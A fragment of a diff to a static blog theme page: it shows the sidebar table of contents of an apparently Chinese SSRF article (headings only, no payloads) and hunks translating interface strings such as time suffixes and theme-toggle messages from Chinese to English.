href="#file"><span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict"><span class="toc-text">dict:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher"><span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp"><span class="toc-text">ftp:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用[::]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用@</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%9F%AD%E5%9C%B0%E5%9D%80"><span class="toc-text">利用短地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8302%E8%B7%B3%E8%BD%AC"><span class="toc-text">利用302跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-text">利用DNS重绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-text">利用进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%89%B9%E6%AE%8A%E5%9C%B0%E5%9D%80"><span class="toc-text">利用特殊地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%A5%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">利用句号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IPv6"><span class="toc-text">利用IPv6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDN"><span class="toc-text">利用IDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%89%B9%E5%AE%9A%E7%BB%93%E5%B0%BE%E5%BC%80%E5%A4%B4"><span class="toc-text">绕过特定结尾开头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="toc-text">读取本地文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3"><span class="toc-text">探测内网端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis"><span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-text">未授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E8%AE%A4%E8%AF%81"><span class="toc-text">弱认证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">MYSQL查询数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB"><span class="toc-text">版本区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MOF%E6%8F%90%E6%9D%83%EF%BC%88Windows%EF%BC%89%EF%BC%9A"><span class="toc-text">MOF提权（Windows）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-text">启动项提权：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-text">日志文件提权：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MySQL-root%E6%9D%83%E9%99%90%EF%BC%9A"><span class="toc-text">利用MySQL root权限：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fpm%EF%BC%88FastCGI%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">fpm（FastCGI协议）</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
@@ -244,10 +287,10 @@
   window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
   const ctx = {
     date_suffix: {
-      just: `刚刚`,
-      min: `分钟前`,
-      hour: `小时前`,
-      day: `天前`,
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
     },
     root : `/`,
     tag_plugins: {
@@ -702,9 +745,9 @@
     utils.dark.method.toggle.start();
 
     const messages = {
-      light: `切换到浅色模式`,
-      dark: `切换到深色模式`,
-      auto: `切换到跟随系统配色`,
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
     }
     hud?.toast?.(messages[newTheme])
   }
@@ -931,7 +974,7 @@
       ctx.copycode = {
         default_text: `Copy`,
         success_text: `Copied`,
-        toast: `复制成功`,
+        toast: `Copied`,
       };
       utils.js('/js/plugins/copycode.js');
     }
